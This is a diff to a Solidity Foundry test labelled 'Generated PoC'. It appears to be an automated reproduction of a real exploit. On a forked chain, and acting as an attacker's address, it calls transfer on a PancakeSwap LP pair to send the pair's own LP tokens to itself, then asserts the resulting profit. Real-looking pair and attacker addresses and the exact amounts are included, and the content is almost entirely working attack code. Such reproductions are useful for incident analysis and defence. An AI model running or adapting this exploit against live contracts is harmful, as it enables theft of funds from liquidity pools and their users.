@@ -21,9 +21,9 @@ import "./Base.sol";
 // Generated PoC
 
 contract AttackTest is Base {
-    address constant ATTACKER_EOA = Addresses.attacker;
-    address constant ATTACK_CONTRACT = Addresses.pancakePair;
-    uint256 constant TRANSFER_AMOUNT = 400498341357466415661652;
+    address constant ATTACKER_EOA = Addresses.AttackerEOA;
+    address constant PANCAKE_PAIR = Addresses.PancakePair;
+    uint256 constant LP_TRANSFER_AMOUNT = 400498341357466415661652;
     uint256 constant FORK_BLOCK = 105692846;
     uint256 constant TX_TIMESTAMP = 1782120218;
     uint256 constant TX_BLOCK_NUMBER = 105692847;
@@ -37,28 +37,30 @@ contract AttackTest is Base {
 
     function testPoC() public {
         vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
-        _prepareProfit(ATTACK_CONTRACT, address(0));
+        _prepareProfit(PANCAKE_PAIR, address(0));
         attack();
         vm.stopPrank();
         _assertProfit();
     }
 
     function attack() internal {
-        require(TX_VALUE == 0, "unexpected tx value");
-        // Unresolved gap: action_graph_validation reports the two internal LP storage writes as
-        // missing semantic-match coverage, so this PoC invokes the evidenced external entry only.
-        IERC20Like(Addresses.pancakePair).transfer(Addresses.pancakePair, TRANSFER_AMOUNT);
+        // Structured gap: the handoff exposes two observe-only storage effects for this transfer, both
+        // missing semantic action bindings. Preserve the normal selector path; do not synthesize storage.
+        bytes memory transferCall =
+            abi.encodeWithSelector(IERC20Like.transfer.selector, PANCAKE_PAIR, LP_TRANSFER_AMOUNT);
+        (bool ok, bytes memory result) = PANCAKE_PAIR.call{value: TX_VALUE}(transferCall);
+        if (!ok) assembly { revert(add(result, 32), mload(result)) }
     }
 
-    function _expectProfitLegs(address profitHolder, address attackChild) internal override {
+    function _expectProfitLegs(address attackContract, address attackChild) internal override {
         attackChild;
         profitLegs.push(
             ProfitLeg({
-                holder: profitHolder,
+                holder: attackContract,
                 alternateHolder: address(0),
-                asset: Addresses.pancakePair,
+                asset: attackContract,
                 symbol: "Cake-LP",
-                expectedDeltaRaw: TRANSFER_AMOUNT,
+                expectedDeltaRaw: LP_TRANSFER_AMOUNT,
                 strict: true,
                 repairPolicy: PROFIT_REPAIR_OBSERVE_ONLY,
                 balancerInternalBalance: false
@@ -68,6 +70,6 @@ contract AttackTest is Base {
 }
 
 library Addresses {
-    address internal constant pancakePair = 0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA;
-    address internal constant attacker = 0xBE8351C14e5108A57A545DFA8669Fa31aA6aDC68;
+    address internal constant PancakePair = 0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA;
+    address internal constant AttackerEOA = 0xBE8351C14e5108A57A545DFA8669Fa31aA6aDC68;
 }
